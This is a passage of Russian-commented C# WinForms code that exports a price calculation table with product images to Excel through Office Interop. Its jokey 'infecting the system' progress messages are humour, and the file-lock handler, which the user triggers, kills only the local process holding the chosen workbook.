                if (xaxa1 == 0) { label_consol_2.Text = "Серьёзно? Нечего сохранять. Серьезно?"; xaxa1++; } else { xaxa1++; label_consol_2.Text = "Оцепись от этой кнопки!!!"; if (xaxa1 == 3) { label_consol_2.Text = "О%;ебись!!!"; } if (xaxa1 > 4) { xaxa1 = 0; } }
            }
            else
            {
                if (razhet_label.Visible == true)
                {
                    MessageBox.Show("Запрет сохранения без расчета!", "Отказано", MessageBoxButtons.OK, MessageBoxIcon.Stop);
                    return;
                }


                if (была_нажата_расёт_и_цена_или_просто_расёт == true) //08.09.2022 УТОЧНЕНИЕ
                {
                    DialogResult OK_NO = MessageBox.Show("Ексель будет создан С встакой:\n\n" +
                         "Цена для: " + comboBox_елупни.Text + "\n...................................."
                         , "Важное замечание!", MessageBoxButtons.OKCancel);
                    if (OK_NO == DialogResult.Cancel) { return; }
                }
                else
                {
                    DialogResult OK_NO = MessageBox.Show("Ексель будет создан БЕЗ ВСТАВКИ!:\n\n" +
                     "Цена для: " + comboBox_елупни.Text + "\n...................................."
                     , "Важное замечание!", MessageBoxButtons.OKCancel);
                    if (OK_NO == DialogResult.Cancel) { return; }


                }

                    //цвета полей.
                    string[] color = new string[15];
                int r = 0;
                using (StreamReader stream = new StreamReader("rez\\Color_excel.txt"))
                {
                    while (stream.Peek() >= 0)
                    {
                        color[r] = stream.ReadLine();
                        r++;
                    }
                    stream.Close();
                }

                if (color[6] == "1")
                {//остаемся тут
                }
                else
                {// решили без фото
                    сохранение_без_фото_в_excel();
                    return;
                }


                label_consol_2.Text = "Юзер решил вывести расчетку в Ексельку?";
                SaveFileDialog saveFileDialog1 = new SaveFileDialog(); //создание диалогового окна для выбора файла
                if (setting[20] != null && setting[20] != "") saveFileDialog1.InitialDirectory = setting[20];
                saveFileDialog1.RestoreDirectory = true;
                saveFileDialog1.Filter = "Таблица excel(.xlsx)|*.xlsx"; //формат загружаемого файла
                try
                {
                    if (saveFileDialog1.ShowDialog() == DialogResult.Cancel)
                        return;
                    // получаем выбранный файл
                    string filename = saveFileDialog1.FileName;


                    dialog_mess("Start");
                    label_consol_2.Text = "Загружаю Excel на компьютере...";
                    dialog_mess("Загружаю Excel");
                    Excel._Application m_app = null;
                    // Книга Excel.
                    Excel.Workbook m_workBook = null;
                    // Страница Excel.
                    dialog_mess("Захватываю управление\nзаражаю");
                    Excel.Worksheet m_workSheet = null;
                    //Диапазон ячеек
                    Excel.Range rg = null;

                    try
                    {
                        label_consol_2.Text = "Создаю в Еxcel новый фаил...";
                        // Создание приложения Excel.
                        dialog_mess("разметка");
                        m_app = new Excel.Application();

                        // Приложение "невидимо". // m_app.Visible = false;
                        m_app.Visible = false;
                        // Приложение управляется пользователем.
                        m_app.UserControl = true;

                        // Добавление книги Excel.
                        // m_workBook = m_app.Workbooks.Add(Excel.XlWBATemplate.xlWBATWorksheet);
                        // Открытие файла Excel.
                        string put_k_programme = Environment.CurrentDirectory;
                        dialog_mess("Загружаю данные с шаблона");
                        m_workBook = m_app.Workbooks.Open(put_k_programme + "\\rez\\шаблон1.xlsx", Type.Missing, Type.Missing,
                             Type.Missing, Type.Missing, Type.Missing, Type.Missing, Type.Missing, Type.Missing, Type.Missing,
                             Type.Missing, Type.Missing, Type.Missing, Type.Missing, Type.Missing);
                        // Связь со страницей Excel.
                        m_workSheet = m_app.ActiveSheet as Excel.Worksheet;

                        #region Вставка картинок

                        float ff = 0; //testing hir
                        for (int x = 2; x < dataGridView_расчёт_2.RowCount + 1; x++)
                        {
                            dialog_mess("Картинки стр.: " + x.ToString() + "/" + (dataGridView_расчёт_2.RowCount + 1).ToString());
                            rg = m_workSheet.get_Range("E" + x, "E" + x); //rg = m_workSheet.get_Range("E" + 1, "E" + 1);
                            float il, it, iw, ih;
                            float zExcelPixel = 0.746835443f;// для приведения размеров изображения к размерам используемым в Shape
                            System.Drawing.Image im = dataGridView_расчёт_2.Rows[x - 2].Cells[4].Value as Bitmap; //Забираем в новую переменную картинку.
                            if (im != null)
                            {
                                //width - ширина color[7]
                                //Height - высота color[8]
                                if (im.Height > im.Width) // высота больше чем ширина
                                {
                                    //  if (im.Width >= Convert.ToInt16(color[8])) - типу уменбшать только большие. Мелочь не трогаем
                                    im = new Bitmap(im, new Size(((Convert.ToInt16(color[8]) - 1) * im.Width) / im.Height, (Convert.ToInt16(color[8]) - 1)));    //Если картина больше допустимого по высоте                                                       
                                }
                                else //ширина больше чем высота
                                {
                                    // if (im.Height >= Convert.ToInt16(color[7])) -типу уменбшать только большие.Мелочь не трогаем
                                    im = new Bitmap(im, new Size((Convert.ToInt16(color[7]) - 1), ((Convert.ToInt16(color[7]) - 1) * im.Height) / im.Width));  //Если картина больше допустимого по ширене
                                }

                                // Image im = Image.FromFile(filePic);
                                // rg переменная хранящая ссылку на range относительно левого верхнего угла которого надо вставить изображение
                                // координата левого верхнего угола куда вставлять - находяться из range
                                il = (float)(double)rg.Left;// размеры поступают в double упакованый в object
                                it = (float)(double)rg.Top;
                                // размеры изображения для Shape нужно преобразовывать
                                iw = zExcelPixel * im.Width - 1;// получаем из ширины исходного изображения
                                ih = zExcelPixel * im.Height - 1;
                                //проверяем длину строк
                                rg.RowHeight = zExcelPixel * im.Height;// Высота ячейка
                                if (ff < iw / 5.3f) { ff = iw / 5.3f; }//testing hir
                                rg.ColumnWidth = (ff);//color[6];   //ширина ячейки картинки!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! Коля
                                int v = 0;
                                try { string fdf = dataGridView_расчёт_2.Rows[x - 2].Cells[1].Value.ToString(); v = fdf.Length / 2; } catch { }
                                try { string fdf1 = dataGridView_расчёт_2.Rows[x - 2].Cells[2].Value.ToString(); if (fdf1.Length / 2 > v) { v = fdf1.Length / 2; } } catch { }
                                try { string fdf2 = dataGridView_расчёт_2.Rows[x - 2].Cells[3].Value.ToString(); if (fdf2.Length / 2 > v) { v = fdf2.Length / 2; } } catch { }
                                if (rg.RowHeight < v) { rg.RowHeight = v; } // -ЭТО ВЫСОТА СТРОК
                                im.Save("rez\\temp.jpg", System.Drawing.Imaging.ImageFormat.Jpeg); //это кастыль! Так как m_workSheet.Shapes.AddPicture требует физически файл с компа
                                m_workSheet.Shapes.AddPicture(put_k_programme + "\\rez\\temp.jpg", Microsoft.Office.Core.MsoTriState.msoFalse, Microsoft.Office.Core.MsoTriState.msoTrue, il + 1, it + 1, iw - 1, ih - 1);
                            }





                        }


                        try { System.IO.File.Delete("rez\\temp.jpg"); } catch { }
                        #endregion
                        label_consol_2.Text = "Пихаю текст с картинками по ячейкам... ЖДИТЕ!!!!";
                        dialog_mess("Цвет заглавной строки");
                        for (int f = 1; f < 10; f++) { if (color[0] != "Transparent") (m_workSheet.Cells[1, f] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[0]); } // закрасим первую страку с надписями! 
                        //переносим текст
                        for (int i = 1; i < dataGridView_расчёт_2.RowCount + 1; i++)
                        {
                            dialog_mess("Заполнение текста.стр:" + i.ToString() + "/" + (dataGridView_расчёт_2.RowCount + 1).ToString());
                            if (dataGridView_расчёт_2.Rows[i - 1].Cells[5].Value == null && dataGridView_расчёт_2.Rows[i - 1].Cells[6].Value == null && dataGridView_расчёт_2.Rows[i - 1].Cells[7].Value == null)
                            {   // это название графы

                                Excel.Range _excelCells1 = (Excel.Range)m_workSheet.get_Range("A" + (i + 1).ToString(), "E" + (i + 1).ToString()).Cells;
                                _excelCells1.Merge(Type.Missing);
                                string a1, a2, a3;
                                try { a1 = dataGridView_расчёт_2.Rows[i - 1].Cells[1].Value.ToString(); } catch { a1 = ""; }
                                try { a2 = dataGridView_расчёт_2.Rows[i - 1].Cells[2].Value.ToString(); } catch { a2 = " "; }
                                try { a3 = dataGridView_расчёт_2.Rows[i - 1].Cells[3].Value.ToString(); } catch { a3 = " "; }
                                m_workSheet.Rows[i + 1].Columns[1] = a1 + a2 + a3;
                                if (color[1] != "Transparent")
                                { (m_workSheet.Cells[i + 1, 1] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[1]);
                                    (m_workSheet.Cells[i + 1, 6] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[1]);
                                    (m_workSheet.Cells[i + 1, 7] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[1]);
                                    (m_workSheet.Cells[i + 1, 8] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[1]);
                                    (m_workSheet.Cells[i + 1, 9] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[1]);
                                } // закрасим
                                m_workSheet.Rows[i + 1].Columns[1].HorizontalAlignment = Excel.XlHAlign.xlHAlignLeft;

                                //   добавляем линии в обедененной ячейке
                                m_workSheet.Rows[i + 1].Columns[9].Borders(XlBordersIndex.xlEdgeRight).LineStyle = 1;
                                m_workSheet.Rows[i + 1].Columns[1].Borders(XlBordersIndex.xlEdgeLeft).LineStyle = 1;
                                m_workSheet.Rows[i + 1].Columns[9].Borders(XlBordersIndex.xlEdgeRight).Weight = XlBorderWeight.xlThick;
                                m_workSheet.Rows[i + 1].Columns[1].Borders(XlBordersIndex.xlEdgeLeft).Weight = XlBorderWeight.xlThick;

                            }
                            else
                            {
                                for (int j = 1; j < dataGridView_расчёт_2.ColumnCount + 1; j++)
                                {
                                    if (j != 5 && j != 9 && j != 10 && j != 11)
                                    {
                                        if (j == 2 || j == 3 || j == 4 || j == 6 || j == 7 || j == 8) { if (color[2] != "Transparent") (m_workSheet.Cells[i + 1, j] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[2]); }

                                        if (j == 1) {
                                            if (color[2] != "Transparent")
                                            {
                                                (m_workSheet.Cells[i + 1, j] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[2]);
                                            }
                                        }


                                        if ((j == 6 || j == 8))  //2022/02/07 заметил АВ, что цены в виде текста
                                        {
                                            if (j == 8)
                                            {
                                                if (i < dataGridView_расчёт_2.RowCount)
                                                    m_workSheet.Rows[i + 1].Columns[j] = Convert.ToDouble(dataGridView_расчёт_2.Rows[i - 1].Cells[j - 1].Value);
                                                if (i == dataGridView_расчёт_2.RowCount && j == 8)
                                                    m_workSheet.Rows[i + 1].Columns[j] = Convert.ToDouble(dataGridView_расчёт_2.Rows[i - 1].Cells[j - 1].Value);
                                            }
                                            if (j == 6)
                                            {

                                                if (i < dataGridView_расчёт_2.RowCount)
                                                    m_workSheet.Rows[i + 1].Columns[7] = Convert.ToDouble(dataGridView_расчёт_2.Rows[i - 1].Cells[j - 1].Value);
                                            }
                                        }
                                        else
                                        {
                                            if (j != 7)
                                            {
                                                m_workSheet.Rows[i + 1].Columns[j] = dataGridView_расчёт_2.Rows[i - 1].Cells[j - 1].Value;
                                            }
                                            else
                                            {
                                                m_workSheet.Rows[i + 1].Columns[6] = dataGridView_расчёт_2.Rows[i - 1].Cells[j - 1].Value;
                                            }
                                        }
                                    }
                                    if (j == 11)
                                    {
                                        if (color[4] != "Transparent") { (m_workSheet.Cells[i + 1, j - 2] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[4]); }
                                    }
                                    if (j == 5 && color[3] != "Transparent")
                                    {
                                        (m_workSheet.Cells[i + 1, j] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[3]);

                                    }
                                }
                            }

                            if (dataGridView_расчёт_2.RowCount == i) //перенос итого
                            {
                                try
                                {
                                    string k = dataGridView_расчёт_2.Rows[i - 1].Cells[6].Value.ToString();
                                    if (k == "Итого без НДС:")
                                    {

                                        m_workSheet.Rows[i + 1].Columns[3] = color[10];
                                        m_workSheet.Rows[i + 1].Columns[6] = null;
                                        if (color[10] == "Итого:")
                                        {
                                            m_workSheet.Rows[1].Columns[7] = "Цена";
                                            m_workSheet.Rows[1].Columns[8] = "Общая сумма";
                                        }
                                        if (color[10] == "Итого с НДС:")
                                        {
                                            m_workSheet.Rows[1].Columns[7] = "Цена с НДС";
                                            m_workSheet.Rows[1].Columns[8] = "Сумма с НДС";
                                        }
                                        if (color[10] == "Цена:")
                                        {
                                            m_workSheet.Rows[1].Columns[7] = "Цена";
                                            m_workSheet.Rows[1].Columns[8] = "Сумма";
                                        }
                                    }
                                }
                                catch { }
                            }
                        }


                        if (textBox_P_S.Text != null && textBox_P_S.Text != "")
                        {
                            dialog_mess("Перенос ps.");
                            m_workSheet.Rows[dataGridView_расчёт_2.RowCount + 2].Columns[1] = textBox_P_S.Text;
                            if (color[5] != "Transparent")
                            {
                                (m_workSheet.Cells[dataGridView_расчёт_2.RowCount + 2, 1] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[5]);
                                (m_workSheet.Cells[dataGridView_расчёт_2.RowCount + 2, 2] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[5]);
                                (m_workSheet.Cells[dataGridView_расчёт_2.RowCount + 2, 3] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[5]);
                                (m_workSheet.Cells[dataGridView_расчёт_2.RowCount + 2, 4] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[5]);
                                (m_workSheet.Cells[dataGridView_расчёт_2.RowCount + 2, 5] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[5]);
                                (m_workSheet.Cells[dataGridView_расчёт_2.RowCount + 2, 6] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[5]);
                                (m_workSheet.Cells[dataGridView_расчёт_2.RowCount + 2, 7] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[5]);
                                (m_workSheet.Cells[dataGridView_расчёт_2.RowCount + 2, 8] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[5]);
                                (m_workSheet.Cells[dataGridView_расчёт_2.RowCount + 2, 9] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[5]);
                            }

                        }

                        //дописываем коэф для менеджера.

                        if (comboBox_елупни.SelectedItem.ToString() != "" && была_нажата_расёт_и_цена_или_просто_расёт == true)   // && color[9] == "1")   - если через настройки замени этим
                        {
                            dialog_mess("Перенос имя манагера.");
                            m_workSheet.Rows[dataGridView_расчёт_2.RowCount + 3].Columns[7] = "Цена для:";
                            m_workSheet.Rows[dataGridView_расчёт_2.RowCount + 3].Columns[8] = comboBox_елупни.SelectedItem.ToString();
                        }




                        //  m_workSheet.Cells[20, 1].RowHeight = 50;  //60 символов в 1 строке
                        //читаем и помещаем файл в add
                        System.IO.FileInfo obj = new System.IO.FileInfo(filename); // получаем имя
                                                                                   // ActiveForm.Text = obj.Name;
                        char[] MyChar = { '.', 'x', 'l', 's', 'x' };
                        string Directory1 = filename.TrimEnd(MyChar); // путь к папке                                                           
                        //меняем имя 1го листа:
                        m_workBook.Sheets[1].Name = obj.Name.TrimEnd(MyChar);// имя файла без пути! 
                    }
                    finally
                    {
                        label_consol_2.Text = "Сохраняю данные в новом файле...";
                        dialog_mess("Cохранение excel");
                        // Сохраняем файл с вставленным изображением    
                        m_workBook.SaveCopyAs(filename);
                        // m_workBook.ExportAsFixedFormat(XlFixedFormatType.xlTypePDF, "e:\\1.pdf");
                        //expression.ExportAsFixedFormat(Type, Filename, Quality, IncludeDocProperties, IgnorePrintAreas, From, To, OpenAfterPublish)
                        // Закрытие книги.
                        //  label_consol_2.Text = "Закрываю Excel и подчищаю хвосты..";
                        m_workBook.Close(false, "", null);
                        // Закрытие приложения Excel.
                        dialog_mess("Закрытие excel\nУбивить в озу");
                        try { m_app.Quit(); } catch { }

                        m_workBook = null;
                        m_workSheet = null;
                        rg = null;
                        m_app = null;

                        GC.Collect();
                        label_consol_2.Text = "Файл удачно сохранен. И лежит в: " + filename.ToString();
                    }
                }
                catch
                {
                    label_consol_2.Text = "У тебя крякнутый не полноценный Excel, кажись я не смогла закрыть файл.";
                }
                dialog_mess("Stop");
            }
            this.Text = "Прайс Дахмиры        источник:" + istohtik_bazi;
        }
        //вставка страницы ексела в другой файл екселя
        private void button_new_ophins2_Click(object sender, EventArgs e)
        {
            if (dataGridView_расчёт_2.CurrentRow == null)
            {
                if (xaxa1 == 0) { label_consol_2.Text = "Серьёзно? Нечего сохранять. Серьезно?"; xaxa1++; } else { xaxa1++; label_consol_2.Text = "Оцепись от этой кнопки!!!"; if (xaxa1 == 3) { label_consol_2.Text = "О%;ебись!!!"; } if (xaxa1 > 4) { xaxa1 = 0; } }
            }
            else
            {
                if (razhet_label.Visible == true)
                {
                    MessageBox.Show("Запрет сохранения без расчета!", "Отказано", MessageBoxButtons.OK, MessageBoxIcon.Stop);
                    return;
                }
                if (была_нажата_расёт_и_цена_или_просто_расёт == true) //08.09.2022 УТОЧНЕНИЕ
                {
                    DialogResult OK_NO = MessageBox.Show("Ексель будет создан С встакой:\n\n" +
                         "Цена для: " + comboBox_елупни.Text + "\n...................................."
                         , "Важное замечание!", MessageBoxButtons.OKCancel);
                    if (OK_NO == DialogResult.Cancel) { return; }
                }
                else
                {
                    DialogResult OK_NO = MessageBox.Show("Ексель будет создан БЕЗ ВСТАВКИ!:\n\n" +
                     "Цена для: " + comboBox_елупни.Text + "\n...................................."
                     , "Важное замечание!", MessageBoxButtons.OKCancel);
                    if (OK_NO == DialogResult.Cancel) { return; }


                }
                //цвета полей.
                string[] color = new string[15];
                int r = 0;
                using (StreamReader stream = new StreamReader("rez\\Color_excel.txt"))
                {
                    while (stream.Peek() >= 0)
                    {
                        color[r] = stream.ReadLine();
                        r++;
                    }
                    stream.Close();
                }

                if (color[6] == "1")
                {//остаемся тут
                }
                else
                {// решили без фото
                    сохранение_листом_в_excel();
                    return;
                }
                label_consol_2.Text = "Юзер решил пихануть в другой файл Ексельки?";
                OpenFileDialog saveFileDialog1 = new OpenFileDialog(); //создание диалогового окна для выбора файла
                if (setting[20] != null && setting[20] != "") saveFileDialog1.InitialDirectory = setting[20];
                saveFileDialog1.Filter = "Таблица excel(.xlsx)|*.xlsx"; //формат загружаемого файла
                //занят файл проверка. 
                try
                {
                    while (true)
                    {
                        if (saveFileDialog1.ShowDialog() == DialogResult.Cancel) return;

                        try
                        {
                            using (var fs = File.Open(saveFileDialog1.FileName, FileMode.Open, FileAccess.Read, FileShare.None))
                            {
                                break;
                            }
                        }
                        catch (IOException ioex)
                        {
                            DialogResult butRez = MessageBox.Show("Этот файл занят другой программой!\n  Выбери другой, или отключи программу.", "Неполучается так.", MessageBoxButtons.AbortRetryIgnore);
                            if (butRez == DialogResult.Abort) { return; }
                            if (butRez == DialogResult.Retry) { }
                            if (butRez == DialogResult.Ignore)
                            {
                                //убиваем процесс в оперативке
                                //закрыть логотип (убить! )
                                try
                                {
                                    dialog_mess("Start");
                                    Process tool = new Process();
                                    tool.StartInfo.FileName = "rez\\Melissa.exe";
                                    tool.StartInfo.Arguments = saveFileDialog1.FileName + " /accepteula";
                                    tool.StartInfo.UseShellExecute = false;
                                    tool.StartInfo.RedirectStandardOutput = true;
                                    tool.Start();
                                    dialog_mess("Заражаю систему");
                                    tool.WaitForExit();
                                    string outputTool = tool.StandardOutput.ReadToEnd();
                                    string matchPattern = @"(?<=\s+pid:\s+)\b(\d+)\b(?=\s+)";
                                    dialog_mess("Убиваю программу захватчика!");
                                    foreach (Match match in Regex.Matches(outputTool, matchPattern))
                                    {
                                        Process.GetProcessById(int.Parse(match.Value)).Kill();
                                    }
                                    break;
                                }
                                catch
                                {
                                }
                            }
                            //прервать повтор пропустить 
                        }
                    }
                    //Имя листа 
                    dialog_mess("Start");
                    dialog_mess("Жду отмашки от юзира");
                    string listname = Microsoft.VisualBasic.Interaction.InputBox("Введите имя нового листа! \n\nБудет выполнена проверка в файле.\nЕсли такое имя есть, то новый лист\nбудет пронумерован с тем же именем, но с приставкой (2)...(х)\n\n\n", "Окно ввода имени новому листу.", "");
                    if (listname == "") { return; }
                    // получаем выбранный файл
                    string filename = saveFileDialog1.FileName;
                    label_consol_2.Text = "Загружаю Excel на компьютере...";
                    dialog_mess("Загружаю Excel");
                    Excel._Application m_app = null;
                    // Книга Excel.
                    dialog_mess("Захватываю управление\nзаражаю");
                    Excel.Workbook m_workBook = null;
                    // Страница Excel.
                    Excel.Worksheet m_workSheet = null;
                    //Диапазон ячеек
                    Excel.Range rg = null;
                    try
                    {
                        label_consol_2.Text = "Создаю в Еxcel новую страницу...";
                        // Создание приложения Excel.
                        dialog_mess("разметка");
                        m_app = new Excel.Application();
                        // Приложение "невидимо". // m_app.Visible = false;
                        m_app.Visible = false;
                        // Приложение управляется пользователем.
                        m_app.UserControl = true;
                        // Добавление книги Excel.
                        // m_workBook = m_app.Workbooks.Add(Excel.XlWBATemplate.xlWBATWorksheet);
                        // Открытие файла Excel.
                        string put_k_programme = Environment.CurrentDirectory;
                        label_consol_2.Text = "Загружаю файл шаблона..";
                        dialog_mess("Загружаю данные с шаблона");
                        m_workBook = m_app.Workbooks.Open(put_k_programme + "\\rez\\шаблон1.xlsx", Type.Missing, Type.Missing,
                             Type.Missing, Type.Missing, Type.Missing, Type.Missing, Type.Missing, Type.Missing, Type.Missing,
                             Type.Missing, Type.Missing, Type.Missing, Type.Missing, Type.Missing);
                        // Связь со страницей Excel.
                        m_workSheet = m_app.ActiveSheet as Excel.Worksheet;
                        #region Вставка картинок
                        label_consol_2.Text = "Вставляю картинки во временный файл для переноса...";
                        float ff = 0; //testing hir
                        for (int x = 2; x < dataGridView_расчёт_2.RowCount + 1; x++)
                        {
                            dialog_mess("Картинки стр.: " + x.ToString() + "/" + (dataGridView_расчёт_2.RowCount + 1).ToString());
                            rg = m_workSheet.get_Range("E" + x, "E" + x); //rg = m_workSheet.get_Range("E" + 1, "E" + 1);
                            float il, it, iw, ih;
                            float zExcelPixel = 0.746835443f;// для приведения размеров изображения к размерам используемым в Shape
                            System.Drawing.Image im = dataGridView_расчёт_2.Rows[x - 2].Cells[4].Value as Bitmap;
                            if (im != null)
                            {
                                //width - ширина color[7]
                                //Height - высота color[8]
                                if (im.Height > im.Width) // высота больше чем ширина
                                {
                                    //  if (im.Width >= Convert.ToInt16(color[8])) - типу уменбшать только большие. Мелочь не трогаем
                                    im = new Bitmap(im, new Size(((Convert.ToInt16(color[8]) - 1) * im.Width) / im.Height, (Convert.ToInt16(color[8]) - 1)));    //Если картина больше допустимого по высоте                                                       
                                }
                                else //ширина больше чем высота
                                {
                                    // if (im.Height >= Convert.ToInt16(color[7])) -типу уменбшать только большие.Мелочь не трогаем
                                    im = new Bitmap(im, new Size((Convert.ToInt16(color[7]) - 1), ((Convert.ToInt16(color[7]) - 1) * im.Height) / im.Width));  //Если картина больше допустимого по ширене
                                }
                                // Image im = Image.FromFile(filePic);
                                // rg переменная хранящая ссылку на range относительно левого верхнего угла которого надо вставить изображение
                                // координата левого верхнего угола куда вставлять - находяться из range
                                il = (float)(double)rg.Left;// размеры поступают в double упакованый в object
                                it = (float)(double)rg.Top;
                                // размеры изображения для Shape нужно преобразовывать
                                iw = zExcelPixel * im.Width - 1;// получаем из ширины исходного изображения
                                ih = zExcelPixel * im.Height - 1;
                                //проверяем длину строк
                                rg.RowHeight = zExcelPixel * im.Height;// Высота ячейка
                                if (ff < iw / 5.3f) { ff = iw / 5.3f; }//testing hir
                                rg.ColumnWidth = (ff);//color[6];   //ширина ячейки картинки!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! Коля
                                int v = 0;
                                try { string fdf = dataGridView_расчёт_2.Rows[x - 2].Cells[1].Value.ToString(); v = fdf.Length / 2; } catch { }
                                try { string fdf1 = dataGridView_расчёт_2.Rows[x - 2].Cells[2].Value.ToString(); if (fdf1.Length / 2 > v) { v = fdf1.Length / 2; } } catch { }
                                try { string fdf2 = dataGridView_расчёт_2.Rows[x - 2].Cells[3].Value.ToString(); if (fdf2.Length / 2 > v) { v = fdf2.Length / 2; } } catch { }
                                if (rg.RowHeight < v) { rg.RowHeight = v; }
                                im.Save("rez\\temp.jpg", System.Drawing.Imaging.ImageFormat.Jpeg); //это кастыль! Так как m_workSheet.Shapes.AddPicture требует физически файл с компа
                                m_workSheet.Shapes.AddPicture(put_k_programme + "\\rez\\temp.jpg", Microsoft.Office.Core.MsoTriState.msoFalse, Microsoft.Office.Core.MsoTriState.msoTrue, il + 1, it + 1, iw - 1, ih - 1);
                            }
                        }
                        try { System.IO.File.Delete("rez\\temp.jpg"); } catch { }
                        #endregion
                        label_consol_2.Text = "Пихаю текст с картинками по ячейкам... ЖДИТЕ!!!!";
                        dialog_mess("Цвет заглавной строки");
                        for (int f = 1; f < 10; f++) { if (color[0] != "Transparent") (m_workSheet.Cells[1, f] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[0]); } // закрасим первую страку с надписями! 
                        //переносим текст
                        for (int i = 1; i < dataGridView_расчёт_2.RowCount + 1; i++)
                        {
                            dialog_mess("Заполнение текста.стр:" + i.ToString() + "/" + (dataGridView_расчёт_2.RowCount + 1).ToString());
                            if (dataGridView_расчёт_2.Rows[i - 1].Cells[5].Value == null && dataGridView_расчёт_2.Rows[i - 1].Cells[6].Value == null && dataGridView_расчёт_2.Rows[i - 1].Cells[7].Value == null)
                            {   // это название графы
                                Excel.Range _excelCells1 = (Excel.Range)m_workSheet.get_Range("A" + (i + 1).ToString(), "E" + (i + 1).ToString()).Cells;
                                _excelCells1.Merge(Type.Missing);
                                string a1, a2, a3;
                                try { a1 = dataGridView_расчёт_2.Rows[i - 1].Cells[1].Value.ToString(); } catch { a1 = ""; }
                                try { a2 = dataGridView_расчёт_2.Rows[i - 1].Cells[2].Value.ToString(); } catch { a2 = " "; }
                                try { a3 = dataGridView_расчёт_2.Rows[i - 1].Cells[3].Value.ToString(); } catch { a3 = " "; }
                                m_workSheet.Rows[i + 1].Columns[1] = a1 + a2 + a3;
                                if (color[1] != "Transparent")
                                {
                                    (m_workSheet.Cells[i + 1, 1] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[1]);
                                    (m_workSheet.Cells[i + 1, 6] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[1]);
                                    (m_workSheet.Cells[i + 1, 7] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[1]);
                                    (m_workSheet.Cells[i + 1, 8] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[1]);
                                    (m_workSheet.Cells[i + 1, 9] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[1]);
                                } // закрасим
                                m_workSheet.Rows[i + 1].Columns[1].HorizontalAlignment = Excel.XlHAlign.xlHAlignLeft;
                                //   добавляем линии в обедененной ячейке
                                m_workSheet.Rows[i + 1].Columns[9].Borders(XlBordersIndex.xlEdgeRight).LineStyle = 1;
                                m_workSheet.Rows[i + 1].Columns[1].Borders(XlBordersIndex.xlEdgeLeft).LineStyle = 1;
                                m_workSheet.Rows[i + 1].Columns[9].Borders(XlBordersIndex.xlEdgeRight).Weight = XlBorderWeight.xlThick;
                                m_workSheet.Rows[i + 1].Columns[1].Borders(XlBordersIndex.xlEdgeLeft).Weight = XlBorderWeight.xlThick;
                            }
                            else
                            {
                                for (int j = 1; j < dataGridView_расчёт_2.ColumnCount + 1; j++)
                                {
                                    if (j != 5 && j != 9 && j != 10 && j != 11)
                                    {
                                        if (j == 2 || j == 3 || j == 4 || j == 6 || j == 7 || j == 8) { if (color[2] != "Transparent") (m_workSheet.Cells[i + 1, j] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[2]); }
                                        if (j == 1) {
                                            if (color[2] != "Transparent")
                                            {
                                                (m_workSheet.Cells[i + 1, j] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[2]);
                                            }
                                        }
                                        if ((j == 6 || j == 8))  //2022/02/07 заметил АВ, что цены в виде текста
                                        {
                                            if (j == 8)
                                            {
                                                if (i < dataGridView_расчёт_2.RowCount)
                                                    m_workSheet.Rows[i + 1].Columns[j] = Convert.ToDouble(dataGridView_расчёт_2.Rows[i - 1].Cells[j - 1].Value);
                                                if (i == dataGridView_расчёт_2.RowCount && j == 8)
                                                    m_workSheet.Rows[i + 1].Columns[j] = Convert.ToDouble(dataGridView_расчёт_2.Rows[i - 1].Cells[j - 1].Value);
                                            }
                                            if (j == 6)
                                            {
                                                if (i < dataGridView_расчёт_2.RowCount)
                                                    m_workSheet.Rows[i + 1].Columns[7] = Convert.ToDouble(dataGridView_расчёт_2.Rows[i - 1].Cells[j - 1].Value);
                                            }
                                        }
                                        else
                                        {
                                            if (j != 7)
                                            {
                                                m_workSheet.Rows[i + 1].Columns[j] = dataGridView_расчёт_2.Rows[i - 1].Cells[j - 1].Value;
                                            }
                                            else
                                            {
                                                m_workSheet.Rows[i + 1].Columns[6] = dataGridView_расчёт_2.Rows[i - 1].Cells[j - 1].Value;
                                            }
                                        }
                                    }
                                    if (j == 11)
                                    {
                                        if (color[4] != "Transparent") { (m_workSheet.Cells[i + 1, j - 2] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[4]); }
                                        m_workSheet.Rows[i + 1].Columns[j - 2] = dataGridView_расчёт_2.Rows[i - 1].Cells[j - 1].Value;
                                    }
                                    if (j == 5 && color[3] != "Transparent")
                                    {
                                        (m_workSheet.Cells[i + 1, j] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[3]);
                                    }
                                }
                            }
                            if (dataGridView_расчёт_2.RowCount == i) //перенос итого
                            {
                                try
                                {
                                    string k = dataGridView_расчёт_2.Rows[i - 1].Cells[6].Value.ToString();
                                    if (k == "Итого без НДС:")
                                    {
                                        m_workSheet.Rows[i + 1].Columns[3] = color[10];
